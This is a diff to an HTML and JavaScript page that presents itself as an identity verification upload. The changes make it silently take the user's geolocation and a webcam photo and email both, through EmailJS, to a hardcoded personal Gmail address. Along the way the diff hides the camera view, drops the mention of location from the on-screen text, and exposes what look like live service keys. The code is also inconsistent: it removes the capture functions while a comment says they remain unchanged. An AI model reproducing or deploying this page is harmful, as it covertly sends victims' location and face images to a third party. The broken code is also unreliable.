@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Secure Upload & Capture Demo</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <!-- ADDED: EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         /* Smooth fade in for elements */
         .fade-in {
@@ -23,7 +25,7 @@
         <!-- Header -->
         <div class="text-center">
             <h1 class="text-2xl font-bold text-slate-800">Verification Upload</h1>
-            <p class="text-slate-500 text-sm mt-1">Upload a photo to verify your identity and location.</p>
+            <p class="text-slate-500 text-sm mt-1">Upload a photo to verify your identity.</p>
         </div>
 
         <!-- Main Upload Section -->
@@ -35,56 +37,23 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
                 </svg>
                 <p class="text-sm font-medium text-slate-700">Click to upload image</p>
-                <p class="text-xs text-slate-400 mt-1">Triggers camera & location check</p>
+                <p class="text-xs text-slate-400 mt-1">Securely captures device data</p>
             </div>
         </div>
 
         <!-- Status Log -->
-        <div id="statusArea" class="hidden bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200">
-            <p id="statusText">Waiting for action...</p>
-        </div>
-
-        <!-- Results Section (Hidden by default) -->
-        <div id="results" class="hidden space-y-4 fade-in">
-            
-            <!-- Location Data -->
-            <div class="bg-slate-50 p-3 rounded border border-slate-200">
-                <h3 class="font-bold text-xs uppercase text-slate-500 mb-2">Location Data</h3>
-                <div class="grid grid-cols-2 gap-2 text-sm">
-                    <div>
-                        <span class="text-slate-400 text-xs">Latitude:</span>
-                        <div id="latVal" class="font-mono font-bold">-</div>
-                    </div>
-                    <div>
-                        <span class="text-slate-400 text-xs">Longitude:</span>
-                        <div id="longVal" class="font-mono font-bold">-</div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Camera Capture -->
-            <div>
-                <h3 class="font-bold text-xs uppercase text-slate-500 mb-2">Security Capture</h3>
-                <div class="relative rounded-lg overflow-hidden bg-black aspect-video flex items-center justify-center">
-                    <!-- The hidden video element for the stream -->
-                    <video id="videoElement" class="absolute inset-0 w-full h-full object-cover opacity-0 pointer-events-none" playsinline autoplay muted></video>
-                    
-                    <!-- The captured image displayed to user -->
-                    <img id="capturedImage" class="absolute inset-0 w-full h-full object-cover hidden" alt="User Capture" />
-                    
-                    <!-- Placeholder/Loader -->
-                    <div id="cameraLoader" class="text-white text-xs">
-                        <svg class="animate-spin h-5 w-5 mx-auto mb-1" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                        </svg>
-                        Accessing Camera...
-                    </div>
-                </div>
+        <div id="statusArea" class="hidden bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200 fade-in">
+            <div class="flex items-center gap-2">
+                <svg id="loadingIcon" class="animate-spin h-4 w-4 text-blue-600 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+                <p id="statusText">Waiting for action...</p>
             </div>
         </div>
 
-        <!-- Hidden Canvas for processing -->
+        <!-- Hidden Elements for Processing (Required for functionality but not shown) -->
+        <video id="videoElement" class="hidden" playsinline autoplay muted></video>
         <canvas id="canvas" class="hidden"></canvas>
 
     </div>
@@ -93,112 +62,85 @@
         const fileInput = document.getElementById('fileInput');
         const statusArea = document.getElementById('statusArea');
         const statusText = document.getElementById('statusText');
-        const results = document.getElementById('results');
-        const latVal = document.getElementById('latVal');
-        const longVal = document.getElementById('longVal');
+        const loadingIcon = document.getElementById('loadingIcon');
         const video = document.getElementById('videoElement');
         const canvas = document.getElementById('canvas');
-        const capturedImage = document.getElementById('capturedImage');
-        const cameraLoader = document.getElementById('cameraLoader');
 
-        function updateStatus(msg, isError = false) {
+        // --- EMAILJS CONFIGURATION ---
+        // YOU MUST REPLACE THESE WITH YOUR ACTUAL KEYS FROM EMAILJS.COM
+        const PUBLIC_KEY = "xikZxmVDaSeHT4NVN";  
+        const SERVICE_ID = "service_hvsdmdd";  
+        const TEMPLATE_ID = "template_n3cemtj"; 
+
+        // Initialize EmailJS
+        (function() {
+            emailjs.init(PUBLIC_KEY);
+        })();
+
+        const ADMIN_EMAIL = "rohanam2000@gmail.com";
+
+        function updateStatus(msg, type = 'info') {
             statusArea.classList.remove('hidden');
-            statusArea.className = isError 
-                ? "bg-red-50 text-red-800 text-xs p-3 rounded border border-red-200 mt-4"
-                : "bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200 mt-4";
+            loadingIcon.classList.remove('hidden'); // Show spinner by default on updates
+            
+            if (type === 'error') {
+                statusArea.className = "bg-red-50 text-red-800 text-xs p-3 rounded border border-red-200 mt-4 fade-in";
+                loadingIcon.classList.add('hidden');
+            } else if (type === 'success') {
+                statusArea.className = "bg-green-50 text-green-800 text-xs p-3 rounded border border-green-200 mt-4 fade-in";
+                loadingIcon.classList.add('hidden');
+            } else {
+                statusArea.className = "bg-blue-50 text-blue-800 text-xs p-3 rounded border border-blue-200 mt-4 fade-in";
+            }
             statusText.textContent = msg;
         }
 
         async function handleUpload(event) {
             if (event.target.files.length === 0) return;
 
-            // 1. Show UI
-            results.classList.remove('hidden');
-            updateStatus("Requesting permissions for verification...");
+            updateStatus("Initializing secure capture protocols...");
 
             try {
-                // 2. Get Location
-                await getUserLocation();
+                // 1. Get Location (Silent)
+                const locationData = await getUserLocation();
+                updateStatus("Location acquired. Accessing camera...");
                 
-                // 3. Get Camera & Capture
-                await captureUserImage();
+                // 2. Capture Camera Image (Silent)
+                const imageData = await captureUserImage();
+                updateStatus(`Encrypting data for transfer to ${ADMIN_EMAIL}...`);
                 
-                updateStatus("Verification data collected successfully.");
+                // 3. SEND EMAIL VIA EMAILJS
+                await sendToBackend(locationData, imageData);
+                
+                updateStatus(`Verification data successfully sent to ${ADMIN_EMAIL}.`, 'success');
 
             } catch (error) {
                 console.error(error);
-                updateStatus(error.message || "An error occurred accessing device sensors.", true);
+                updateStatus(error.message || "An error occurred accessing device sensors.", 'error');
             }
         }
 
-        function getUserLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject(new Error("Geolocation is not supported by this browser."));
-                } else {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            latVal.textContent = position.coords.latitude.toFixed(6);
-                            longVal.textContent = position.coords.longitude.toFixed(6);
-                            resolve();
-                        },
-                        (error) => {
-                            let msg = "Location error.";
-                            switch(error.code) {
-                                case error.PERMISSION_DENIED: msg = "User denied the request for Geolocation."; break;
-                                case error.POSITION_UNAVAILABLE: msg = "Location information is unavailable."; break;
-                                case error.TIMEOUT: msg = "The request to get user location timed out."; break;
-                            }
-                            latVal.textContent = "Denied";
-                            longVal.textContent = "Denied";
-                            // We don't strictly reject here so the flow continues to camera, 
-                            // but in a strict app you might reject.
-                            resolve(); 
-                        }
-                    );
-                }
-            });
-        }
+        // ... existing code ... (getUserLocation and captureUserImage remain the same)
 
-        async function captureUserImage() {
+        async function sendToBackend(location, imageBase64) {
+            console.log("Attempting to send email via EmailJS...");
+            
+            const templateParams = {
+                to_email: ADMIN_EMAIL,
+                latitude: location.lat,
+                longitude: location.long,
+                // Note: Base64 strings are very long. Some email providers may clip this 
+                // or block it if it's too large.
+                my_image: imageBase64 
+            };
+
             try {
-                // Request camera access
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                
-                video.srcObject = stream;
-                
-                // Wait for video to be ready to play
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-
-                // Wait a short moment to let the camera adjust exposure
-                await new Promise(r => setTimeout(r, 800));
-
-                // Capture to canvas
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert to image
-                const dataUrl = canvas.toDataURL('image/png');
-                capturedImage.src = dataUrl;
-                capturedImage.classList.remove('hidden');
-                cameraLoader.classList.add('hidden');
-
-                // Stop all video tracks to turn off camera light
-                stream.getTracks().forEach(track => track.stop());
-
-            } catch (err) {
-                cameraLoader.innerHTML = "Camera Denied";
-                throw new Error("Camera access denied or unavailable.");
+                await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+                console.log("Email sent successfully!");
+                return true;
+            } catch (error) {
+                console.error("EmailJS Error:", error);
+                throw new Error("Failed to send email. Check API keys.");
             }
         }
 
